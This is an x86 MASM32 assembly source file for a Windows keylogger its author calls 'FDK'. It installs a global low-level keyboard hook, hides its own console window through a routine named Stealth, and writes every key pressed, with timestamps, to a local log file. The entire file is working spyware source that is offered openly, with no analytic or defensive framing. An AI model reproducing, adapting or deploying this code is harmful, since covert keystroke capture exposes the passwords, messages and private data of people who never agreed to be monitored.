; By Falsedeer@gamer.com.tw, 2022/07/26

.386
.model flat, stdcall
option casemap: none

include c:\masm32\include\kernel32.inc
include c:\masm32\include\windows.inc
include c:\masm32\include\user32.inc
include c:\masm32\include\msvcrt.inc

includelib c:\masm32\lib\kernel32.lib
includelib c:\masm32\lib\user32.lib
includelib c:\masm32\lib\msvcrt.lib

; prototype for C's printf
printf proto c, output:vararg
;prototype for sprintf
sprintf proto c, output:vararg
; prototype for low level keyboard proc callback function
KeyboardProc proto near stdcall, hook_code:DWORD, hook_wparam:DWORD, hook_lparam:DWORD
; prototype for stealth function to hide the console
Stealth proto near c

.data

window_handle dd 0 ; for console
file_handle dd 0 ; for logfile
vkcode dd 0
scancode dd 0
timestamp dd 0
keybuffer dd 0 ; for holding ToUnicodeEx buffer

success db "success",0
error db "error",0
window_title db "Falsedeer's keylogger(FDK) - Ver-0.1.0",0
classname db "ConsoleWindowClass",0
logfile_name db "FDK.txt",0 ; logfile for saving keystroke
catch_report db " %s (timestamp %d) ", 0
k_spacebar db "[space]", 0
k_enter db "[enter]", 0
k_backspace db "[backspace]", 0
k_rightshift db "[right-shift]", 0
k_tab db "[tab]", 0
k_caplock db "[caplock]", 0
k_leftshift db "[left-shift]", 0
k_ctrl db "[ctrl]", 0
k_windows db "[Win]", 0
k_esc db "[ese]", 0
k_del db "[del]", 0
k_f1 db "[f1]", 0
k_f2 db "[f2]", 0
k_f3 db "[f3]", 0
k_f4 db "[f4]", 0
k_f5 db "[f5]", 0
k_f6 db "[f6]", 0
k_f7 db "[f7]", 0
k_f8 db "[f8]", 0
k_f9 db "[f9]", 0
k_f10 db "[f10]", 0
k_f11 db "[f11]", 0
k_f12 db "[f12]", 0
k_prtscn db "[prtscn]", 0
k_home db "[home]", 0
k_end db "[end]", 0
k_pgup db "[pgup]", 0
k_pgdn db "[pgdn]", 0

msg MSG <>

keystate db 256 dup(0) ; for holding current 256 byte keyboard status array
reportformat db 50 dup(0)
resetbuffer db 50 dup(0) ; for reset reportformat buffer area to ovoid overflow
.code

; =============== self-defined procedure ==============
KeyboardProc PROC near stdcall, hook_code:DWORD, hook_wparam:DWORD, hook_lparam:DWORD ; hook keyboard callback
detr_process:
  cmp hook_code, 0
  jl goto_ex
  cmp hook_wparam, WM_KEYDOWN ; only record WM_KEYDOWN to avoid multiple reocrd(KEYDOWN + KEYUP) of singular key press
  jnz goto_ex ; record everything except ALT, ALT+KEY system key combinations

record_key: ; save keystroke to logfile
  xor edx, edx
  mov esi, [hook_lparam]
  lodsd ; mov double(vkCode) from [hook_lparam] to eax
  mov [vkcode], eax
  lodsd ; get scancod
  mov [scancode], eax
  lodsd ; pass flag
  lodsd ; get timestamp
  mov [timestamp], eax

check_exception: ; special key which can't be translated by ToUnicodeEx
  cmp [vkcode], 20h
  jz spacekey
  cmp [vkcode], 08h
  jz backspacekey
  cmp [vkcode], 0dh
  jz enterkey
  cmp [vkcode], 0a1h
  jz rightshiftkey
  cmp [vkcode], 09h
  jz tabkey
  cmp [vkcode], 14h
  jz caplockkey
  cmp [vkcode], 0a0h
  jz leftshiftkey
  cmp [vkcode], 0a2h
  jz ctrlkey
  cmp [vkcode], 5bh
  jz windowskey
  cmp [vkcode], 1bh
  jz esckey
  cmp [vkcode], 2eh
  jz delkey
  cmp [vkcode], 70h
  jz f1key
  cmp [vkcode], 71h
  jz f2key
  cmp [vkcode], 72h
  jz f3key
  cmp [vkcode], 73h
  jz f4key
  cmp [vkcode], 74h
  jz f5key
  cmp [vkcode], 75h
  jz f6key
  cmp [vkcode], 76h
  jz f7key
  cmp [vkcode], 77h
  jz f8key
  cmp [vkcode], 78h
  jz f9key
  cmp [vkcode], 79h
  jz f10key
  cmp [vkcode], 7ah
  jz f11key
  cmp [vkcode], 7bh
  jz f12key
  cmp [vkcode], 24h
  jz homekey
  cmp [vkcode], 2ch
  jz prtscnkey
  cmp [vkcode], 24h
  jz homekey
  cmp [vkcode], 23h
  jz endkey
  cmp [vkcode], 21h
  jz pgupkey
  cmp [vkcode], 22h
  jz pgdnkey

translate: ; translate vkcode to readable char
  invoke GetKeyboardState, addr keystate ; get current key state
  invoke GetKeyboardLayout, 0 ; get HKL
  invoke ToUnicodeEx, [vkcode], [scancode], addr keystate, addr keybuffer, 4, 0, eax ; problem !!
  call Resetbuff
  invoke sprintf, addr reportformat, addr catch_report, addr keybuffer, [timestamp]
  invoke WriteFile, [file_handle], addr reportformat, 25, NULL, NULL
  jmp goto_ex

spacekey:
  call Resetbuff
  invoke sprintf, addr reportformat, addr catch_report, addr k_spacebar, [timestamp]
  invoke WriteFile, [file_handle], addr reportformat, 35, NULL, NULL
  jmp goto_ex

enterkey:
  call Resetbuff
  invoke sprintf, addr reportformat, addr catch_report, addr k_enter, [timestamp]
  invoke WriteFile, [file_handle], addr reportformat, 35, NULL, NULL
  jmp goto_ex

backspacekey:
  call Resetbuff
  invoke sprintf, addr reportformat, addr catch_report, addr k_backspace, [timestamp]
  invoke WriteFile, [file_handle], addr reportformat, 35, NULL, NULL
  jmp goto_ex

rightshiftkey:
  call Resetbuff
  invoke sprintf, addr reportformat, addr catch_report, addr k_rightshift, [timestamp]
  invoke WriteFile, [file_handle], addr reportformat, 35, NULL, NULL
  jmp goto_ex

tabkey:
  call Resetbuff
  invoke sprintf, addr reportformat, addr catch_report, addr k_tab, [timestamp]
  invoke WriteFile, [file_handle], addr reportformat, 35, NULL, NULL
  jmp goto_ex

caplockkey:
  call Resetbuff
  invoke sprintf, addr reportformat, addr catch_report, addr k_caplock, [timestamp]
  invoke WriteFile, [file_handle], addr reportformat, 35, NULL, NULL
  jmp goto_ex

leftshiftkey:
  call Resetbuff
  invoke sprintf, addr reportformat, addr catch_report, addr k_leftshift, [timestamp]
  invoke WriteFile, [file_handle], addr reportformat, 35, NULL, NULL
  jmp goto_ex

ctrlkey:
  call Resetbuff
  invoke sprintf, addr reportformat, addr catch_report, addr k_ctrl, [timestamp]
  invoke WriteFile, [file_handle], addr reportformat, 35, NULL, NULL
  jmp goto_ex

windowskey:
  call Resetbuff
  invoke sprintf, addr reportformat, addr catch_report, addr k_windows, [timestamp]
  invoke WriteFile, [file_handle], addr reportformat, 35, NULL, NULL
  jmp goto_ex

esckey:
  call Resetbuff
  invoke sprintf, addr reportformat, addr catch_report, addr k_esc, [timestamp]
  invoke WriteFile, [file_handle], addr reportformat, 35, NULL, NULL
  jmp goto_ex

delkey:
  call Resetbuff
  invoke sprintf, addr reportformat, addr catch_report, addr k_del, [timestamp]
  invoke WriteFile, [file_handle], addr reportformat, 35, NULL, NULL
  jmp goto_ex

f1key:
  call Resetbuff
  invoke sprintf, addr reportformat, addr catch_report, addr k_f1, [timestamp]
  invoke WriteFile, [file_handle], addr reportformat, 35, NULL, NULL
  jmp goto_ex

f2key:
  call Resetbuff
  invoke sprintf, addr reportformat, addr catch_report, addr k_f2, [timestamp]
  invoke WriteFile, [file_handle], addr reportformat, 35, NULL, NULL
  jmp goto_ex

f3key:
  call Resetbuff
  invoke sprintf, addr reportformat, addr catch_report, addr k_f3, [timestamp]
  invoke WriteFile, [file_handle], addr reportformat, 35, NULL, NULL
  jmp goto_ex

f4key:
  call Resetbuff
  invoke sprintf, addr reportformat, addr catch_report, addr k_f4, [timestamp]
  invoke WriteFile, [file_handle], addr reportformat, 35, NULL, NULL
  jmp goto_ex

f5key:
  call Resetbuff
  invoke sprintf, addr reportformat, addr catch_report, addr k_f5, [timestamp]
  invoke WriteFile, [file_handle], addr reportformat, 35, NULL, NULL
  jmp goto_ex

f6key:
  call Resetbuff
  invoke sprintf, addr reportformat, addr catch_report, addr k_f6, [timestamp]
  invoke WriteFile, [file_handle], addr reportformat, 35, NULL, NULL
  jmp goto_ex

f7key:
  call Resetbuff
  invoke sprintf, addr reportformat, addr catch_report, addr k_f7, [timestamp]
  invoke WriteFile, [file_handle], addr reportformat, 35, NULL, NULL
  jmp goto_ex

f8key:
  call Resetbuff
  invoke sprintf, addr reportformat, addr catch_report, addr k_f8, [timestamp]
  invoke WriteFile, [file_handle], addr reportformat, 35, NULL, NULL
  jmp goto_ex

f9key:
  call Resetbuff
  invoke sprintf, addr reportformat, addr catch_report, addr k_f9, [timestamp]
  invoke WriteFile, [file_handle], addr reportformat, 35, NULL, NULL
  jmp goto_ex

f10key:
  call Resetbuff
  invoke sprintf, addr reportformat, addr catch_report, addr k_f10, [timestamp]
  invoke WriteFile, [file_handle], addr reportformat, 35, NULL, NULL
  jmp goto_ex

f11key:
  call Resetbuff
  invoke sprintf, addr reportformat, addr catch_report, addr k_f11, [timestamp]
  invoke WriteFile, [file_handle], addr reportformat, 35, NULL, NULL
  jmp goto_ex

f12key:
  call Resetbuff
  invoke sprintf, addr reportformat, addr catch_report, addr k_f12, [timestamp]
  invoke WriteFile, [file_handle], addr reportformat, 35, NULL, NULL
  jmp goto_ex

prtscnkey:
  call Resetbuff
  invoke sprintf, addr reportformat, addr catch_report, addr k_prtscn, [timestamp]
  invoke WriteFile, [file_handle], addr reportformat, 35, NULL, NULL
  jmp goto_ex

homekey:
  call Resetbuff
  invoke sprintf, addr reportformat, addr catch_report, addr k_home, [timestamp]
  invoke WriteFile, [file_handle], addr reportformat, 35, NULL, NULL
  jmp goto_ex

endkey:
  call Resetbuff
  invoke sprintf, addr reportformat, addr catch_report, addr k_end, [timestamp]
  invoke WriteFile, [file_handle], addr reportformat, 35, NULL, NULL
  jmp goto_ex

pgupkey:
  call Resetbuff
  invoke sprintf, addr reportformat, addr catch_report, addr k_pgup, [timestamp]
  invoke WriteFile, [file_handle], addr reportformat, 35, NULL, NULL
  jmp goto_ex

pgdnkey:
  call Resetbuff
  invoke sprintf, addr reportformat, addr catch_report, addr k_pgdn, [timestamp]
  invoke WriteFile, [file_handle], addr reportformat, 35, NULL, NULL
  jmp goto_ex

goto_ex: ; handle hc_noremove
  invoke CallNextHookEx, NULL, hook_code, hook_wparam, hook_lparam
  ret

KeyboardProc ENDP

Stealth PROC near c ; hide console
  invoke ShowWindow, [window_handle], SW_HIDE ; hide
  ret
Stealth ENDP

Resetbuff PROC near c
bakup:
  pusha
  cld
  lea esi, resetbuffer
  lea edi, reportformat
  mov ecx, 50
  rep movsb

finish:
  popa
  ret
Resetbuff ENDP
; ================================== main code ==============================

init: ; init some value before execution
  invoke CreateFileA, addr logfile_name, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL ; create or overwrite existing logfile
  cmp eax, INVALID_HANDLE_VALUE
  jz status_error
  mov [file_handle], eax

  invoke AllocConsole ; create a console for keylogger to locate
  invoke FindWindowEx, NULL, NULL, addr classname, NULL ; locate current console created by program
  test eax, eax ; check if locate fail
  jz status_error
  mov [window_handle], eax

  invoke SetWindowTextA, [window_handle], addr window_title ; re-define windows text

hide: ; hide current window of executing program
  call Stealth

main: ; main code of keylogger
  invoke SetWindowsHookExA, WH_KEYBOARD_LL, ADDR KeyboardProc, NULL, 0
  test eax, eax ; check if hook succeed
  jz status_error

get_message: ; loop
  invoke GetMessage, addr msg, NULL, 0, 0
  cmp eax, 0
  invoke TranslateMessage, addr msg
  invoke DispatchMessage, addr msg
  jg get_message

; exit program
status_success:
  invoke MessageBoxA, NULL, addr success, addr success, MB_OK
  jmp exit

status_error:
  invoke MessageBoxA, NULL, addr error, addr error, MB_OK

exit:
  ret

end init
